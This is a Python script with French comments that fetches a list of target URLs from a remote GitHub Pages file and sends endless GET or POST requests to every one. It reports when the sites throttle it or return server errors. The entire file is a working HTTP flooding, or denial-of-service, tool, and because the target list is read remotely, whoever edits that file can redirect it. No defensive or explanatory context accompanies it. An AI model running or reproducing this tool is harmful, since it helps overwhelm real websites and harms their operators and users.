import argparse
import requests
import random
import time
from urllib.parse import urlparse

url_list = []
payload = ""
requestCounter = 0
printedMsgs = []

def printMsg(msg):
    if msg not in printedMsgs:
        print(f"\n{msg} after {requestCounter} requests")
        printedMsgs.append(msg)

def handleStatusCodes(statusCode, url):
    global requestCounter
    requestCounter += 1
    print(f"\r{requestCounter} requests have been sent to {urlparse(url).netloc}")

    if statusCode == 429:
        printMsg("You have been throttled")
    if statusCode == 500:
        printMsg("Status code 500 received")
    if statusCode == 400:
        printMsg("You have been throttled")

def sendGET(url):
    resp = requests.get(url)
    handleStatusCodes(resp.status_code, url)

def sendPOST(url):
    resp = requests.post(url, data=payload)
    handleStatusCodes(resp.status_code, url)

def fetch_urls():
    # Récupérer la liste des URL depuis un fichier txt sur un serveur distant
    url_list_url = "https://alphaleadership.github.io/wolf_01/url_list.txt"  # Remplacez par l'URL du fichier txt
    response = requests.get(url_list_url)
    if response.status_code == 200:
        url_list = response.text.splitlines()
        return url_list
    else:
        print("Erreur lors de la récupération de la liste des URL")
        return []

def main():
    global url_list, payload
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", help="Specify data payload for POST request")
    args = parser.parse_args()

    payload = args.d

    url_list = fetch_urls()

    if not url_list:
        parser.print_help()
        return
    while(True):
        for url in url_list:
            if payload:
                sendPOST(url)
            else:
                sendGET(url)

if __name__ == "__main__":
    main()



